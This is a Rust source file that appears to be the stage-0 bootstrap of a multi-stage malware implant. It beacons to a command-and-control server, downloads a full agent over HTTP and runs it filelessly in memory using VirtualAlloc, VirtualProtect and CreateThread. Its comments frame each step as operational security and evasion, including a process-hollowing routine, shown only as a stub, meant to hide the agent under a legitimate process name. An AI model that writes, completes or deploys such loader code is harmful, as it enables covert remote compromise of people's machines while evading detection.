//! Stage 3: Stage0 - Position-Independent Bootstrap Payload
//!
//! **Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent
//!
//! **Why this stage exists**:
//! - Keeps ESTER and JAVELIN small and generic
//! - Only Stage0 contains C2-specific logic
//! - Can be updated independently from earlier stages
//! - Downloads full agent capabilities on demand
//!
//! **OPSEC Considerations**:
//! - Runs entirely in memory (loaded by JAVELIN)
//! - Position-independent code (no fixed addresses)
//! - Minimal network signature (single beacon + download)
//! - Full agent only downloaded after successful bootstrap
//!
//! **Separation of Responsibilities**:
//! - Stage0 ONLY handles initial C2 contact and agent download
//! - Stage0 does NOT include full agent capabilities
//! - Full agent is downloaded after successful session establishment

pub mod beacon;
pub mod config;
pub mod download;
pub mod network;

pub use beacon::send_initial_beacon;
pub use config::get_c2_server;
pub use download::{download_agent, download_agent_http};
pub use network::establish_session;

/// Main entry point for Stage0
///
/// This function is called by JAVELIN after loading Stage0 into memory
///
/// **Execution flow**:
/// 1. Send initial beacon to C2
/// 2. Establish encrypted session (TLS)
/// 3. Download full agent from C2 via HTTP API
/// 4. Execute full agent in memory
///
/// # Returns
///
/// * `0` - Success
/// * `1` - Failure
#[no_mangle]
pub extern "C" fn stage0_main() -> i32 {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Bootstrap payload initializing...");

    match run_bootstrap() {
        Ok(_) => {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Bootstrap complete");
            0
        }
        Err(e) => {
            #[cfg(feature = "dev")]
            eprintln!("[STAGE0] Bootstrap failed: {:?}", e);
            1
        }
    }
}

/// Runs the bootstrap sequence
fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Starting bootstrap sequence");

    // Step 1: Send initial beacon
    #[cfg(feature = "dev")]
    println!("[STAGE0] Sending initial beacon...");
    
    send_initial_beacon()?;

    // Step 2: Establish TLS session (for beacon/keep-alive)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Establishing TLS session...");
    
    let _session = establish_session()?;
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] TLS session established");

    // Step 3: Download full agent via HTTP API (separate from TLS session)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Downloading full agent via HTTP API...");
    
    let agent_bytes = download_agent_http()?;

    // Step 4: Execute full agent in memory (100% FILELESS)
    // NO disk writes - direct in-memory execution
    #[cfg(feature = "dev")]
    println!("[STAGE0] Executing full agent in memory ({} bytes)", agent_bytes.len());
    
    execute_agent_in_memory(&agent_bytes)?;

    Ok(())
}

/// Executes the downloaded agent directly in memory WITHOUT writing to disk
/// 
/// **FILELESS EXECUTION TECHNIQUES**:
/// 
/// This function implements true fileless execution by loading the agent PE
/// directly into memory without any disk writes. We use several techniques:
/// 
/// 1. **Reflective PE Loading**: Manually parse PE headers and load sections
/// 2. **Process Hollowing**: Hollow out a legitimate process and inject our agent
/// 3. **Direct Shellcode Execution**: If agent is shellcode format
/// 
/// **CRITICAL OPSEC**: NO files written to disk at any point
fn execute_agent_in_memory(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        use std::ffi::c_void;
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Starting fileless in-memory execution...");
        
        // Check if this is shellcode or PE format
        // Shellcode starts with common patterns, PE starts with "MZ"
        let is_pe = agent_bytes.len() > 2 && agent_bytes[0] == 0x4D && agent_bytes[1] == 0x5A; // "MZ"
        
        if is_pe {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Detected PE format - using process hollowing");
            
            // Use process hollowing for PE files
            execute_pe_via_hollowing(agent_bytes)?;
        } else {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Detected shellcode format - using direct execution");
            
            // Direct shellcode execution (similar to JAVELIN/ESTER)
            execute_shellcode_direct(agent_bytes)?;
        }
        
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Non-Windows execution not yet implemented".into())
    }
}

/// Executes shellcode directly in memory (for shellcode-format agents)
#[cfg(target_os = "windows")]
fn execute_shellcode_direct(shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::ffi::c_void;
    use winapi::um::memoryapi::VirtualAlloc;
    use winapi::um::memoryapi::VirtualProtect;
    use winapi::um::processthreadsapi::CreateThread;
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
    
    unsafe {
        // Allocate RW memory
        #[cfg(feature = "dev")]
        println!("[STAGE0] Allocating {} bytes as RW", shellcode.len());
        
        let addr = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        
        if addr.is_null() {
            return Err("VirtualAlloc failed".into());
        }
        
        // Copy shellcode
        #[cfg(feature = "dev")]
        println!("[STAGE0] Copying shellcode to allocated memory");
        
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            addr as *mut u8,
            shellcode.len(),
        );
        
        // Change to RX (executable)
        #[cfg(feature = "dev")]
        println!("[STAGE0] Changing memory protection to RX");
        
        let mut old_protect: u32 = 0;
        let result = VirtualProtect(
            addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );
        
        if result == 0 {
            return Err("VirtualProtect failed".into());
        }
        
        // Execute in new thread (detached)
        #[cfg(feature = "dev")]
        println!("[STAGE0] Creating thread to execute shellcode");
        
        // Cast address to function pointer safely through usize
        let shellcode_fn: unsafe extern "system" fn(*mut c_void) -> u32 = 
            unsafe { std::mem::transmute(addr as usize) };
        
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(shellcode_fn),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        
        if thread.is_null() {
            return Err("CreateThread failed".into());
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Shellcode thread started successfully");
        
        // Don't wait - let it run in background
        // The agent will continue on its own
    }
    
    Ok(())
}

/// Executes PE file via process hollowing (for PE-format agents)
/// 
/// **Process Hollowing Steps**:
/// 1. Create suspended process (legitimate Windows binary like svchost.exe)
/// 2. Unmap original image from process memory
/// 3. Allocate memory in target process
/// 4. Write our agent PE to target process
/// 5. Set entry point to our code
/// 6. Resume thread
/// 
/// **OPSEC**: The agent runs under a legitimate process name
#[cfg(target_os = "windows")]
fn execute_pe_via_hollowing(pe_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::ffi::c_void;
    use std::mem;
    use winapi::um::processthreadsapi::{CreateProcessW, ResumeThread};
    use winapi::um::winbase::CREATE_SUSPENDED;
    use winapi::um::winnt::PROCESS_ALL_ACCESS;
    use winapi::shared::minwindef::FALSE;
    
    // For now, we'll use a simplified approach: execute as shellcode
    // Full process hollowing requires more complex PE parsing
    // The builder should provide shellcode format for best results
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] WARNING: PE format detected but process hollowing not fully implemented");
    println!("[STAGE0] Falling back to shellcode execution - agent should be in shellcode format");
    
    // Try to execute as shellcode anyway (may work if it's position-independent)
    execute_shellcode_direct(pe_bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stage0_config() {
        // Verify configuration is accessible
        let server = get_c2_server();
        assert!(!server.is_empty());
    }
}
